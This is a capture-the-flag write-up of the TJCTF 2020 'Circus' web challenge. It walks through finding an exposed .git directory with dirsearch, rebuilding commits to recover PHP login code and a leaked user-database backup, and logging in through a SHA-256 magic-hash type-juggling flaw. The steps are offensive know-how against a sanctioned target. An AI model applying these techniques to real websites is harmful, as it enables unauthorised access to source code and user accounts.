---
title: TJCTF - Circus challenge writeup
date: 2020-05-27 17:30:00 +0530
categories: [Technical, CTF-writeups]
tags: [ctf, writeups, git-security, php-type-juggling, magic-hashes]
---

![TJCTF 2020](/assets/img/posts/tjctf-gamerw-writeup/TJCTF.png "TJCTF2020")

This is a writeup for the `Circus` challenge in the recently held [TJCTF 2020](https://tjctf.org/).

![Challenge](/assets/img/posts/tjctf-circus-writeup/chall-circus.png "Circus")

After staring at the website for some time and going through its source code, I didn't find anything of significance. So I decided to use the [`dirsearch`](https://github.com/maurosoria/dirsearch) command line tool to look for files and directories in the website.

```bash
$ python dirsearch.py -b -u https://circus.tjctf.org/ -e *
```

The tool gave me some interesting results - 

![dirseach result](/assets/img/posts/tjctf-circus-writeup/dirsearch-result.png "dirsearch results")

As you can see from the image, the website had hosted its version control repository (`.git/`) in production. This is bad and can be used to gain access to the website's source code.

Please refer this [post](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/) for more detailed information on this.

Heading to `https://circus.tjctf.org/.git/refs/heads/master` gave us the commit hash `4879af041fba89b387e751a94bfe5dbee4bd7528`.

We use this to download the commit-object from the server by going to `https://circus.tjctf.org/.git/objects/48/79af041fba89b387e751a94bfe5dbee4bd7528`

I then created a local git repository and pasted the commit-object file in the `.git/objects/48` folder.

> **Note**: Here 48 is the first 2 bytes of the commit hash

```bash
$ mkdir cirucs
$ cd circus/
$ git init
$ mkdir .git/objects/48/
$ cp ~/Downloads/79af041fba89b387e751a94bfe5dbee4bd7528 ~/Downloads/circus/.git/objects/48/
```

Now we can analyse it further:

This tells us that the downloaded object is a commit:

```bash
$ git cat-file -t 4879af041fba89b387e751a94bfe5dbee4bd7528
commit
```

Getting further details:

```bash
$ git cat-file -p 4879af041fba89b387e751a94bfe5dbee4bd7528
tree 2f16dc45649e2748d2345f01b076fb6efae38f47
parent e2731f0ea54feb0a892fd5377a932053bb3baf61
author kfb <kfb@circus.tjctf.org> 1584979440 -0700
committer kfb <kfb@circus.tjctf.org> 1584979440 -0700

oops
```

We next download the tree object and analyse it in the same way. Go to `https://circus.tjctf.org/.git/objects/2f/16dc45649e2748d2345f01b076fb6efae38f47` to download the object and paste it in the `circus/.git/objects/2f/` folder.

Analysing the tree object:

```bash
$ git cat-file -p 2f16dc45649e2748d2345f01b076fb6efae38f47
100644 blob 0c2dcae6b4a2df8b0e36f9764c82e67f63b6ffa5	.gitignore
040000 tree efb43702c73bf9b9ed4bdc67ab139e8431fff12e	css
040000 tree af6d89e6ba71c3d121bb931e11d2d0ca52f4bcb3	img
100644 blob ad9052a7a90a878dcbb120089eb96739149511ac	index.php
040000 tree 4604bf31e608e07a063c11888dc3092cf77ccfff	js
040000 tree 8a0a57c3988c44b23e079e4cccf603bc58d911b8	lib
100644 blob ef808b5889ece41f90c38567d53b7e8e13c0a489	logout.php
```

We now download the `index.php` blob (follow the same step as above) and cat its contents.

We extract the following PHP code from the file:

```php
<?php 
	require __DIR__ . "/../include/flag.php";

	session_start();
	$error = "";
	mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
	if (isset($_POST["username"]) && isset($_POST["password"]))
	{
		try
		{
			$mysqli = new mysqli(NULL, NULL, NULL, "circus");
			$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
			$stmt->bind_param("s", $_POST["username"]);
			$stmt->execute();
			$res = $stmt->get_result();
			if ($res->num_rows === 0)
			{
				$error = "Invalid credentials";
			}
			else
			{
				$row = $res->fetch_assoc();
				if (hash('sha256', $_POST["password"]) == $row["password"])
				{
					$_SESSION["id"] = $row["id"];
					$_SESSION["name"] = $row["fname"];
				}
			}
		}
		catch (Exception $e)
		{
			$error = "Error signing in";
		}
	}
?>
```

From `https://circus.tjctf.org/.git/logs/refs/heads/master` we can see that the commit hash we analysed was the second commit. The commit message "oops" also hints that the developer might have pushed some sensitive content in his first commit which he corrected in the second commit. But the sensitive content will still be stored in the git version history.

Read this [blog post](https://www.honeybadger.io/blog/git-security/) for more.

We saw that the second commit contained a new `.gitignore` file. So lets print the contents of that.

```bash
$ git cat-file -p 0c2dcae6b4a2df8b0e36f9764c82e67f63b6ffa5
backup.sh
backups
```

We can see that the developer must have committed the `backup.sh` file before (1st commit) which he has now put in the `.gitnore` file now.

Going to `https://circus.tjctf.org/backup.sh` , we are pointed to `https://circus.tjctf.org/backups/users.sql` which gives us the backup of the database containing usernames and their password hashes.

The password verification logic in the PHP code uses the "==" operator and we have the SHA-256 password hashes of the users, so it was safe to assume that the website may be susceptible to `Type Juggling attack through magic hash comparison`.

Refer this [blog post](https://www.whitehatsec.com/blog/magic-hashes/) for more about magic hashes.

I searched the SQL file for a password hash which fit the magic hash format of `0+e[0-9]+` and was able to find a user who fit the bill:

```
(773,'Andon1956','0e75759761935916943951971647195794671357976597614357959761597165','Rosie','Kelly')
```

All that I had to do now, was use the username `Andon1956` along with a matching SHA-256 magic hash.

[This](https://github.com/spaze/hashes/blob/master/sha256.md) GitHub repository holds a list of SHA-256 magic hashes.

The flag was displayed on screen after logging in.

![Challenge Flag](/assets/img/posts/tjctf-circus-writeup/chall-flag.png "Circus Flag")

I would like to thank [Nimisha Dughyala](https://www.linkedin.com/in/nimisha-dughyala/) for guiding me in solving this challenge. It wouldn't have been possible without her :)